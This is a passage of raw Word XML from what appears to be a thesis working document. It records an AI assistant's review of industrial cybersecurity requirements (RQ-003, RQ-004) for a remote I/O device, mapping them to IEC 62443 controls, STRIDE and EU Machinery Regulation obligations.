          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="67B8751A" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The killer gap you missed is time (G-2):</w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> no RTC; uptime </w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>resets on cold start</w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → collected evidence is not time-attributable and is erasable by a power cycle (anti-forensic Tampering, MITRE </w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>T0872</w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">). </w:t>
      </w:r>
      <w:hyperlink r:id="rId82" w:history="1">
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2A715112" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00A16302" w:rsidRDefault="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>STRIDE:</w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Repudiation is right; add the </w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Tampering-on-audit-data</w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> vector (cold-start clearing) to justify </w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CR 3.9</w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="583FE539" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Debug port:</w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> your reading is correct — fusing is an </w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EDR 2.13 design exclusion</w:t>
      </w:r>
      <w:r w:rsidRPr="00A16302">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, not evidence; the residual (a re-probe generates no log entry) stands. </w:t>
      </w:r>
      <w:hyperlink r:id="rId83" w:history="1">
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[100_SRIO_P...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00271C74">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="264992B3" w14:textId="77777777" w:rsidR="00271C74" w:rsidRPr="00271C74" w:rsidRDefault="00271C74" w:rsidP="00271C74">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>Would</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>you</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> like </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>me</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>to</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> (a) </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>complete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>TC-RQ003-02</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> (SVV-2, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>legitimate</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve">-intervention </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>evidence</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve">) and </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>TC-RQ003-05</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> (SVV-3, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>fused</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>diagnostic</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve">-interface </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>exclusion</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve">), (b) </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>compile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>RQ-001 → RQ-003</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>into</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>single</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>formatted</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Word/PDF </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>thesis</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>appendix</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>with</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>consolidated</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>traceability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>matrix</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>or</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> (c) </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>proceed</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00271C74">
        <w:t>to</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00271C74">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>RQ-004</w:t>
      </w:r>
      <w:r w:rsidRPr="00271C74">
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56390A6B" w14:textId="77777777" w:rsidR="00271C74" w:rsidRDefault="00271C74" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60709A92" w14:textId="77777777" w:rsidR="00A16302" w:rsidRDefault="00A16302" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="726EC7E0" w14:textId="77777777" w:rsidR="0043237E" w:rsidRDefault="0043237E" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7EF1D183" w14:textId="77777777" w:rsidR="0043237E" w:rsidRDefault="0043237E" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="704C711C" w14:textId="77777777" w:rsidR="0043237E" w:rsidRDefault="0043237E" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64416559" w14:textId="77777777" w:rsidR="0043237E" w:rsidRDefault="0043237E" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="322FB4AE" w14:textId="77777777" w:rsidR="0043237E" w:rsidRDefault="0043237E" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A1D39A0" w14:textId="42647D5A" w:rsidR="0043237E" w:rsidRPr="00C1714F" w:rsidRDefault="0043237E" w:rsidP="0043237E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t xml:space="preserve">REQUIREMENT </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="double"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61DE7EBD" w14:textId="77777777" w:rsidR="00A16302" w:rsidRPr="00EB0F23" w:rsidRDefault="00A16302" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="143DE1C2" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00E404B9" w:rsidP="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-004 — Reprocessed (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="250A7EC2" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00E404B9" w:rsidP="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Correction applied: Rechecking RQ-004 against the same scope-boundary discipline, I found one genuine scope error and one debatable over-reach in my original analysis:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EADA38F" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Scope error (the RQ-002-analogous one): I cited the I&amp;M0 REVISION_COUNTER as a "data identification" mechanism. That is wrong for the same reason the audit material was wrong in RQ-002 — REVISION_COUNTER increments on </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>modification</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; it is </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>modification-evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, which belongs to RQ-009, not </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>identification</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. It counts </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>that</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the config changed, not </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>what</w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the config is. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Removed</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>from</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-004 and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>returned</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>to</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-009.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06685894" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w:rsidRDefault="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Over-reach: I mapped CR 3.4 (identification integrity) + a Spoofing threat + a standalone MITM test (TC-RQ004-04). </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">On reflection, </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>protecting</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the identification data against falsification is the substance of RQ-005 ("protect identified software and data against corruption"). RQ-004 is a pure identify requirement. I have demoted this to a cross-reference to RQ-005 rather than a primary RQ-004 mapping/test.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C1ADF02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What survives is the clean, two-limb requirement the </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>device text</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>your own submission</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> framed: completeness of identification (CR 7.8) + confidentiality of the identification data (CR 4.1).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DEA473C" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00000000" w:rsidP="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:pict w14:anchorId="46454135">
          <v:rect id="_x0000_i1045" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FBBBE35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Step 1 — Critical Review &amp; Theoretical Validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="607CE94B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1.1 Requirement &amp; CR Mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="330ECDC5" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00E404B9" w:rsidP="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">EU Machinery Regulation (EU) 2023/1230 identification obligation — </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>identify the software and data critical for EHSR compliance</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Pure </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>inventory</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>identification</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>requirement</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9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789"/>
        <w:gridCol w:w="1352"/>
        <w:gridCol w:w="4718"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="1F59EB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F8CB2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96165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Your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E407E1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0F41BD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Correction</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w14:paraId="23A479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74ACA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CR 7.8 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Component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inventory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D18D3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E30A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Correct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primary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CE32F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Keep. Modern CR 7.8 = SBOM-grade inventory → drives the decisive gap G-2.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w14:paraId="546E0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D93E8A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CR 4.1 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Confidentiality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of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information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1262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25182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DB4CF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Keep. Add CR 4.3 — no HTTPS (SRIO-7907), so no transport confidentiality for the identification data.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="2D40D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84294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del w:id="6" w:author="Unknown">
              <w:r w:rsidRPr="00CB35D8">
                <w:rPr>
                  <w:b/>
                  <w:bCs/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:delText>CR 3.4 – Identification integrity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EE582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7797A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Demoted</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
